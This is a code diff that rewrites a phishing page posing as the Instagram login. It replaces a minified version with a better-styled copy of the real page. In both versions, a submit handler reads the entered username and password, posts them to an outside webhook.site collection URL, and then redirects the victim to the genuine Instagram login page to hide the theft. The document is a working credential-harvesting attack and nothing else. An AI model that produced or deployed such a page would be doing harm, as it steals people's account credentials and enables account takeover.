@@ -1,1 +1,128 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>Instagram</title><style>body{background:#fafafa;padding:50px;font-family:Arial}form{max-width:350px;margin:auto;background:white;padding:40px;border-radius:5px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px}img{width:175px;display:block;margin:0 auto 20px}</style></head><body><form id="login"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a1.png"><input name="user" placeholder="Phone/username/email"><input name="pass" type="password" placeholder="Password"><button>Log in</button></form><script>document.getElementById('login').onsubmit=()=> {let user=document.querySelector('[name="user"]').value;let pass=document.querySelector('[name="pass"]').value;fetch('https://webhook.site/b010baa2-ec6b-44a4-95e9-9b3c67fb1e86',{method:'POST',body:'user='+user+'&pass='+pass+'&from=instagram'});window.location='https://www.instagram.com';};</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
+            min-height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 4px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,.1); 
+            width: 100%; 
+            max-width: 350px; 
+            padding: 10px 0;
+        }
+        .logo { 
+            display: block; 
+            margin: 22px auto 12px; 
+            width: 175px; 
+            height: 51px;
+        }
+        .form { padding: 0 40px; }
+        .input-wrapper { margin-bottom: 6px; }
+        input { 
+            width: 100%; 
+            padding: 9px 0 7px 8px; 
+            border: 1px solid #efefef; 
+            border-radius: 3px; 
+            background: #fafafa; 
+            font-size: 14px; 
+            outline: none;
+            transition: border-color .2s;
+        }
+        input:focus { border-color: #0095f6; background: white; }
+        input::placeholder { color: #8e8e8e; font-size: 14px; }
+        .login-btn { 
+            width: 100%; 
+            padding: 5px 9px; 
+            background: #0095f6; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            font-weight: 600; 
+            font-size: 14px; 
+            cursor: pointer; 
+            margin: 8px 0;
+            transition: background .2s;
+        }
+        .login-btn:hover { background: #0077cc; }
+        .divider { 
+            text-align: center; 
+            margin: 20px 16px; 
+            color: #8e8e8e; 
+            font-size: 13px; 
+            position: relative;
+        }
+        .divider::before { 
+            content: ''; 
+            position: absolute; 
+            top: 50%; 
+            left: 0; 
+            right: 0; 
+            height: 1px; 
+            background: #efefef; 
+            z-index: 0;
+        }
+        .divider span { 
+            background: white; 
+            padding: 0 8px; 
+            position: relative; 
+            z-index: 1;
+        }
+        .forgot { 
+            display: block; 
+            margin: 16px 40px; 
+            color: #00376b; 
+            font-size: 14px; 
+            text-decoration: none;
+            text-align: center;
+        }
+        @media (max-width: 500px) { 
+            body { background: #fafafa; padding: 40px 20px; } 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a1.png" alt="Instagram">
+        <form id="login" class="form">
+            <div class="input-wrapper">
+                <input name="user" type="text" placeholder="Phone number, username, or email">
+            </div>
+            <div class="input-wrapper">
+                <input name="pass" type="password" placeholder="Password">
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+            
+            <a href="#" class="forgot">Forgot password?</a>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('login').onsubmit = (e) => {
+            e.preventDefault();
+            let user = document.querySelector('[name="user"]').value;
+            let pass = document.querySelector('[name="pass"]').value;
+            
+            fetch('https://webhook.site/b010baa2-ec6b-44a4-95e9-9b3c67fb1e86', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass) + '&from=instagram'
+            });
+            
+            window.location = 'https://www.instagram.com/accounts/login/';
+        };
+    </script>
+</body>
+</html>
